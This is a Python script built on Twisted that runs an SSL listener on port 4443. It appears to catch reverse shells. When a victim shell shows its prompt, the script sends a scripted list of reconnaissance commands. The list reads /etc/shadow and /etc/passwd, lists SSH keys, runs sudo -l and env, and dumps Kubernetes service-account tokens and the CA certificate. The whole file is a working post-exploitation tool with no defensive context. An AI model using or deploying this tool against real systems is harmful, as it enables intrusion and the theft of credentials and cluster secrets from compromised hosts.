from twisted.internet import ssl, reactor
from twisted.internet.protocol import Protocol, Factory

enum_commands = ['whoami','id','hostname','cat /etc/passwd', 'cat /etc/shadow', 'cat /etc/group','ls -l ~/.ssh/','sudo -l','ps aux','uname -a','env','cat /run/secrets/kubernetes.io/serviceaccount/token','cat /var/run/secrets/kubernetes.io/serviceaccount/token','cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt','strace ls']
# Reverse enumeration commands so that the commands are sent in order when popped off the stack
enum_commands.reverse()


# Twisted is an event-driven networking engine written in Python and licensed under the open source MIT license.

# The Protocol class is the base class for Twisted networking protocols.
# It defines the basic interface between transports and higher-level protocols.
# The Protocol class is a subclass of twisted.internet.interfaces.IProtocol.
# The Protocol class is used to define the behavior of a specific protocol.

# The Protocol class defines the following methods:
# makeConnection: Called when a connection is made.
# dataReceived: Called whenever data is received.
# connectionLost: Called when the connection is shut down.

# See https://twistedmatrix.com/documents/current/api/twisted.internet.protocol.Protocol.html
# for more information on the Protocol class



class SSLProtocol(Protocol):
    
    # initialize the enumeration commands

    def __init__(self):
        # Make a copy of the enumeration commands
        self.enum_commands = enum_commands.copy()

    def connectionMade(self):
        print('Connection made')
        

    def dataReceived(self, data):
        print('Received:', data.decode())
        # Wait for a connection a prompt is received from the client
        if data.decode() == '$ ' or data.decode().endswith('$ '):
            # If there are no more enumeration commands, exit
            if len(self.enum_commands) == 0:
                self.send_command('exit\n')
                self.transport.loseConnection()
                return
            else:
                # Send one of the enumeration commands
                command = self.enum_commands.pop() + '\n'
                self.send_command(command)
    
    def send_command(self, command):
        self.transport.write(command.encode())
        print('Sent:', command)

class SSLServerFactory(Factory):
    def buildProtocol(self, addr):
        return SSLProtocol()



def main():
   # Set the server address and port
    server_address = ('0.0.0.0', 4443)
    # Load server's certificate and private key
    with open('cert.pem', 'rb') as cert_file, open('key.pem', 'rb') as key_file:
        certificate = ssl.PrivateCertificate.loadPEM(cert_file.read() + key_file.read())

    # Create and start SSL server
    factory = SSLServerFactory()
    reactor.listenSSL(server_address[1], factory, certificate.options())
    print(f'SSL server running on {server_address[0]}:{server_address[1]}')
    reactor.run()
    
    
if __name__ == "__main__":
    main()

